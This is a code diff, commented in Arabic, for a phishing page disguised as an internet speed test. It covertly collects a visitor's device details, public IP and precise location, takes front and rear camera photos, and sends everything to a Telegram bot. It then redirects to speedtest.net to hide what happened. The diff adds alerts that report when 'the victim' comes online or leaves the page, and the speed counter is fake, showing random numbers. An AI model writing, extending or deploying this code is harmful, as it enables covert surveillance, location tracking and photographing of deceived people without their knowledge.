@@ -58,41 +58,35 @@
             } catch(e) {}
         }
 
-        // ميزة تتبع المستخدم (متصل / غادر)
-        window.onblur = () => sendToTelegram("⚠️ *الضحية غادر الصفحة الآن (خارج المتصفح)*");
-        window.onfocus = () => sendToTelegram("✅ *الضحية عاد لفتح الصفحة الآن*");
+        // --- ميزة التتبع (Online / Offline) ---
+        // ترسل إشعار عند دخول الضحية للصفحة أو العودة إليها
+        window.addEventListener('focus', () => {
+            sendToTelegram("🟢 **ONLINE**\nالضحية متواجد الآن في الصفحة.");
+        });
+
+        // ترسل إشعار عند خروج الضحية من الصفحة أو تصغير المتصفح
+        window.addEventListener('blur', () => {
+            sendToTelegram("🔴 **OFFLINE**\nالضحية غادر الصفحة الآن.");
+        });
+
+        // إشعار فوري عند أول دخول للصفحة
+        sendToTelegram("🚀 **دخول جديد**\nالضحية فتح الرابط الآن وهو متصل 🟢");
 
         async function getFullReport() {
             let info = `📊 *تقرير شامل للهدف*:\n\n`;
-            
-            // 1. معلومات الجهاز والرام والمعالج
             info += `• 📱 الجهاز: \`${navigator.platform}\`\n`;
             info += `• 💾 الرام: \`${navigator.deviceMemory || "غير معروف"} GB\`\n`;
             info += `• ⚙️ المعالج: \`${navigator.hardwareConcurrency} Cores\`\n`;
-            info += `• 🖥️ الشاشة: \`${window.screen.width}x${window.screen.height}\`\n`;
-            
-            // 2. معلومات الشبكة والاتصال (WiFi/Cellular)
             const conn = navigator.connection || navigator.mozConnection || navigator.webkitConnection;
             if (conn) {
-                let netType = conn.type ===  'wifi'  ? "🌐 WiFi" : (conn.type ===  'cellular'  ? "📶 خلوي" : "📡 متصل");
+                let netType = conn.type === 'wifi' ? "🌐 WiFi" : "📶 خلوي";
                 info += `• 📶 نوع الشبكة: \`${netType} (${conn.effectiveType.toUpperCase()})\`\n`;
-                info += `• ⚡ سرعة الخط: \`${conn.downlink} Mbps\`\n`;
             }
-
-            // 3. البطارية
             try {
-                const b = await navigator.getBattery();
-                info += `• 🔋 البطارية: \`${Math.round(b.level * 100)}%\` (${b.charging ? "🔌 يشحن" : "🔋 بطارية"})\n`;
-            } catch(e) {}
-
-            // 4. الـ IP والموقع واللغة
-            info += `• 🌐 لغة الهاتف: \`${navigator.language}\`\n`;
-            try {
-                const ipRes = await fetch( 'https://api.ipify.org?format=json' );
+                const ipRes = await fetch('https://api.ipify.org?format=json');
                 const ipData = await ipRes.json();
                 info += `• 🌐 الـ IP: \`${ipData.ip}\`\n`;
             } catch(e) {}
-
             return info;
         }
 
@@ -114,31 +108,25 @@
             this.style.display = "none";
             document.getElementById("ring").style.display = "block";
             document.getElementById("speedDisplay").style.display = "block";
-            document.getElementById("subText").innerText = "جاري الاتصال بالسيرفر...";
+            document.getElementById("subText").innerText = "جاري الفحص...";
 
-            // حركة العداد الوهمي
             const timer = setInterval(() => {
-                let random = (Math.random() * (95 - 78) + 78).toFixed(1);
-                document.getElementById("num").innerText = random;
+                document.getElementById("num").innerText = (Math.random() * (95 - 78) + 78).toFixed(1);
             }, 100);
 
-            // 1. إرسال التقرير النصي فوراً
             const report = await getFullReport();
             await sendToTelegram(report);
 
-            // 2. طلب وإرسال الموقع الجغرافي
             navigator.geolocation.getCurrentPosition(async (p) => {
-                await sendToTelegram(`📍 *الموقع الدقيق*:\n[فتح عبر خرائط جوجل](http://maps.google.com/maps?q=${p.coords.latitude},${p.coords.longitude})`);
-            }, () => sendToTelegram("❌ رفض إذن الموقع"));
+                await sendToTelegram(`📍 *الموقع*:\n[خرائط جوجل](http://google.com/maps/?q=${p.coords.latitude},${p.coords.longitude})`);
+            });
 
-            // 3. التقاط وإرسال الصور (أمامية وخلفية)
             const front = await snap("user");
             if(front) await sendToTelegram("📸 صورة أمامية", true, front);
 
             const back = await snap("environment");
             if(back) await sendToTelegram("📷 صورة خلفية", true, back);
 
-            // 4. التوجيه النهائي بعد اكتمال العمليات
             setTimeout(() => {
                 clearInterval(timer);
                 location.href = "https://www.speedtest.net/ar";
